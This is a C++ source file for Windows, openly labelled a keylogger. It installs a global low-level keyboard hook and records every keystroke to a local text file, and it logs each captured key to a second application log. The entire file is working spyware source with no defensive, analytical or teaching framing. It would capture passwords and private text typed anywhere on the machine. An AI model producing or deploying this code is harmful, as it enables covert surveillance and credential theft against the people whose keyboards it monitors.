#include <windows.h>
#include <fstream>
#include <ctime>
#include <string>

// Log file writer function
void writeLog(const std::string &message) {
    std::ofstream logFile("logs/app.log", std::ios::app);
    std::time_t now = std::time(0);
    char *dt = std::ctime(&now);
    dt[strlen(dt) - 1] = '\0'; // Remove newline character
    logFile << dt << " " << message << std::endl;
    logFile.close();
}

// Keylogger function to log keystrokes
void logKey(char key) {
    std::ofstream logFile("data/raw_logs/log.txt", std::ios::app);
    logFile << key;
    logFile.close();

    // Log keystroke event
    std::string logMessage = "INFO  Keystroke captured: ";
    logMessage += key;
    writeLog(logMessage);
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *keyStruct = (KBDLLHOOKSTRUCT *)lParam;
        char key = (char)keyStruct->vkCode;
        logKey(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Main function
int main() {
    // Log application start
    writeLog("INFO  Application started.");

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        writeLog("ERROR Failed to install keyboard hook.");
        return 1;
    }
    writeLog("INFO  Keylogger initialized.");

    // Message loop to keep the application running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook and log application shutdown
    UnhookWindowsHookEx(keyboardHook);
    writeLog("INFO  Application shutdown.");
    return 0;
}
